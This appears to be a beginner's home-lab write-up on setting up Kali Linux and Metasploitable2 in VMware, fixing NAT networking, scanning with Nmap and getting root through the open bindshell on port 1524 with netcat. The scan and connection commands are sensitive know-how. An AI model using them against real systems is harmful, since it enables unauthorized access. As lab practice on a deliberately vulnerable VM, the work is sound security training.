🧪 Home Lab 01 – Kali Setup + First Exploit (Metasploitable2)
🎯 Objective

Set up a local cybersecurity lab using Kali Linux and Metasploitable2, perform enumeration, identify vulnerabilities, and gain root access.

🧱 Lab Environment
🖥️ Attacker Machine

OS: Kali Linux (VMware)

RAM: 16 GB allocated

Network: NAT

🎯 Target Machine

OS: Metasploitable2

Network: NAT

⚙️ Initial Setup
1. Kali Installation

Imported prebuilt Kali VMware image

Configured:

Network Adapter: NAT

Connected at power on

2. Network Troubleshooting

Encountered:

Temporary failure resolving 'http.kali.org'
🔧 Fixes Applied

Ensured VM network adapter was Connected

Restarted VMware services:

VMware NAT Service

VMware DHCP Service

Restored Virtual Network defaults

Re-added network adapter

Verified IP assignment:

ip a

Result:

inet 192.168.74.128
3. System Update
sudo apt update && sudo apt full-upgrade -y
sudo apt autoremove -y
reboot
🧱 Lab Setup
1. Import Metasploitable2

Opened .vmx file in VMware

Set network to NAT

2. Verify Connectivity
On Metasploitable:
ip a

Result:

192.168.74.129
From Kali:
ping 192.168.74.129

✅ Successful communication

🔍 Enumeration
Nmap Scan
nmap -sC -sV 192.168.74.129
🔑 Key Findings
Port	Service	Notes
21	vsftpd 2.3.4	Known backdoor vulnerability
22	SSH	Open
23	Telnet	Insecure
80	Apache	Web server
445	Samba	Potential exploitation
1524	Bindshell	🚨 Direct root access
3306	MySQL	Database
8180	Tomcat	Web app
💥 Exploitation
🎯 Target: Port 1524 (Bindshell)
Command:
nc 192.168.74.129 1524
🎯 Result
root@metasploitable:/#
Verification
whoami

Output:

root
🧠 Analysis

Port 1524 exposed a preconfigured bindshell

No authentication required

Immediate root-level access granted

Represents a critical misconfiguration/backdoor

🔐 Security Insight

This demonstrates:

The importance of port scanning

Risks of unsecured services

Why network monitoring and segmentation are critical

📸 Evidence (Add Screenshots)

Nmap scan results

Netcat connection

Root shell (whoami)

📁 Folder Structure
~/lab/
├── ctf/
├── notes/
├── loot/
├── scripts/
├── writeups/
│   └── metasploitable2/
🚀 Key Takeaways

Successfully built a working cyber lab

Performed enumeration using Nmap

Identified vulnerable services

Achieved root access via manual exploitation

Established foundation for red/blue team exercises

🔄 Next Steps

Capture attack traffic with Wireshark

Analyze logs and detect activity

Integrate Splunk for monitoring

Expand lab with Windows + Active Directory
